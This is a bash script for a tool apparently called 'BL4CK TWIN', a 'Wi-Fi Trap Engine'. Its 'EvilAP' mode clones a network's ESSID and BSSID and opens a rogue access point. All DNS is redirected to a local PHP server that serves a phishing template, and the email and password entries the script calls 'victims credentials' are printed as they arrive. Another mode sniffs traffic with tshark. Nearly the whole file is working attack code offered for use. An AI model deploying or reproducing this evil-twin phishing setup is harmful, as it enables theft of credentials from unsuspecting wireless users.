#!/bin/bash

# Colors
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
CYAN='\e[1;36m'
PURPLE='\e[1;35m'
RESET='\e[0m'

TOKEN_FILE="$HOME/.ipinfo_token"


resolve_ip() {
    ip=$1
    if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        domain=$(curl -s "https://ipinfo.io/$ip?token=$api_token" | grep '"hostname":' | awk -F'"' '{print $4}')
        echo "${domain:-$ip}"
    else
        echo "$ip"
    fi
}


check_token() {
    if [[ ! -f "$TOKEN_FILE" ]]; then
        echo -e "${YELLOW}[+] Please get your IPInfo token from: https://ipinfo.io${RESET}"
        read -p "Enter Token: " token
        echo "$token" > "$TOKEN_FILE"
    fi
    api_token=$(cat "$TOKEN_FILE")
}


cleanup_services() {
    echo -e "\n${YELLOW}[+] Cleaning up conflicting services...${RESET}"
    sudo pkill dnsmasq
    sudo pkill hostapd
    sudo systemctl stop apache2
    sudo systemctl stop NetworkManager
    sudo systemctl stop wpa_supplicant
    sudo fuser -k 67/udp &>/dev/null
    sudo fuser -k 80/tcp &>/dev/null
}


echo -e "${BLUE}[INFO] Checking requirements...${RESET}"
sleep 1
REQUIRED_TOOLS=(hostapd dnsmasq php xterm tshark curl)
MISSING_TOOLS=()

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
        echo -e "${RED}[$tool] ❌ Missing${RESET}"
        MISSING_TOOLS+=("$tool")
    else
        echo -e "${GREEN}[$tool] ✅ OK${RESET}"
    fi
done

if [ ${#MISSING_TOOLS[@]} -ne 0 ]; then
    echo -e "\n${YELLOW}Install missing tools? (y/n)${RESET}"
    read -p "> " ans
    if [[ "$ans" =~ ^[Yy]$ ]]; then
        sudo apt update
        sudo apt install -y "${MISSING_TOOLS[@]}"
    else
        exit 1
    fi
fi

clear
echo -e "${RED}"
cat << "EOF"
╔══════════════════════════════════════════╗
║       B L 4 C K  T W I N   T O O L       ║
╚══════════════════════════════════════════╝
        ▷ Wi-Fi Trap Engine v1.4
             DEVELOPED by: WH04M1
EOF
echo -e "$RESET"

echo -e "\n${BLUE}[?] Select Mode:${RESET}"
echo -e "${BLUE}1) PrivateAP${RESET}  → Closed Network"
echo -e "${BLUE}2) EvilAP${RESET}     → Open Network with Captive Portal"
echo -e "${BLUE}3) Sniffing${RESET}   → Live Network Capture & Domain Resolve"
echo -ne "\n${RED}BL4CKN3T>${RESET} "
read mode

cleanup_services


if [[ "$mode" == "1" || "$mode" == "2" ]]; then
    read -p $'\n\e[1;33m[?] Enter ESSID: \e[0m' essid
    read -p $'\e[1;33m[?] Enter BSSID (AA:BB:CC:DD:EE:FF): \e[0m' bssid
    read -p $'\e[1;33m[?] Enter Channel (1-13): \e[0m' channel
    read -p $'\e[1;33m[?] Enter Interface (e.g., wlan0): \e[0m' iface
fi


if [[ "$mode" == "1" ]]; then
    read -p $'\e[1;33m[?] Enter Wi-Fi Password: \e[0m' wifipass
    cat > hostapd.conf <<EOF
interface=$iface
driver=nl80211
ssid=$essid
bssid=$bssid
channel=$channel
hw_mode=g
wpa=2
wpa_passphrase=$wifipass
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    ip link set $iface up
    ip addr flush dev $iface
    ip addr add 192.168.1.1/24 dev $iface
    iptables --flush
    iptables -t nat --flush
    iptables -P FORWARD ACCEPT
    iptables -t nat -A POSTROUTING -o $iface -j MASQUERADE
    xterm -hold -e "hostapd hostapd.conf" &


elif [[ "$mode" == "2" ]]; then
    cat > hostapd.conf <<EOF
interface=$iface
driver=nl80211
ssid=$essid
bssid=$bssid
channel=$channel
hw_mode=g
auth_algs=1
ignore_broadcast_ssid=0
EOF
    cat > dnsmasq.conf <<EOF
interface=$iface
dhcp-range=192.168.1.10,192.168.1.50,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
EOF
    echo -e "${YELLOW}[+] Available Templates:${RESET}"
    templates=()
    index=1
    for f in sites/*.html; do
        fname=$(basename "$f")
        echo -e "${BLUE}[$index] $fname${RESET}"
        templates+=("$fname")
        ((index++))
    done
    read -p $'\n[?] Select Template: ' t
    template_file="${templates[$((t-1))]}"
    cp "sites/$template_file" html/index.html
    echo -e "${GREEN}[+] Template Selected: $template_file${RESET}"
    echo -e "${YELLOW}[+] Waiting for victims credentials....${RESET}"
    ip link set $iface up
    ip addr flush dev $iface
    ip addr add 192.168.1.1/24 dev $iface
    iptables --flush
    iptables -t nat --flush
    iptables -P FORWARD ACCEPT
    iptables -t nat -A POSTROUTING -o $iface -j MASQUERADE
    xterm -hold -e "hostapd hostapd.conf" &
    sleep 2
    xterm -hold -e "dnsmasq -C dnsmasq.conf" &
    cd html && touch log.txt
    xterm -hold -e "php -S 0.0.0.0:80" &
    tail -f log.txt | while read line; do
        email=$(echo "$line" | cut -d '|' -f2 | xargs)
        pass=$(echo "$line" | cut -d '|' -f3 | xargs)
        echo -e "${GREEN}EMAIL: $email ${RESET}| ${RED}PASSWORD: $pass${RESET}"
    done


elif [[ "$mode" == "3" ]]; then
    check_token
    read -p $'\n\e[1;33m[?] Enter Interface (e.g., wlan0 or eth0): \e[0m' iface
    read -p $'\e[1;33m[?] Save to file? (y/n): \e[0m' save_choice
    [[ "$save_choice" =~ ^[Yy]$ ]] && read -p "Enter log file name: " logfile
    clear
    echo -e "${BLUE}[+] Starting Sniffing on $iface... Press CTRL+C to stop.${RESET}"
    printf "${CYAN}%-8s | %-10s | %-50s | %-50s${RESET}\n" "TIME" "PROTO" "SRC" "DST"
    echo -e "${GREEN}------------------------------------------------------------------------------------------------------------------------------------------------------${RESET}"
    tshark -i "$iface" -Y "ip" -T fields -e frame.time_relative -e _ws.col.Protocol -e ip.src -e ip.dst -l | while read time proto src dst; do
        srcdom=$(resolve_ip "$src")
        dstdom=$(resolve_ip "$dst")
        case "$proto" in
            HTTP) color="\e[1;32m" ;;
            TLSv1*|HTTPS) color="\e[1;34m" ;;
            DNS) color="\e[1;33m" ;;
            MDNS) color="\e[1;35m" ;;
            *) color="\e[0m" ;;
        esac
        printf "%-8s | ${color}%-10s${RESET} | %-50s | %-50s\n" "$time" "$proto" "$srcdom" "$dstdom"
        [[ "$save_choice" =~ ^[Yy]$ ]] && echo "$time | $proto | $srcdom | $dstdom" >> "$logfile"
    done
else
    echo -e "${RED}[!] Invalid Option!${RESET}"
fi
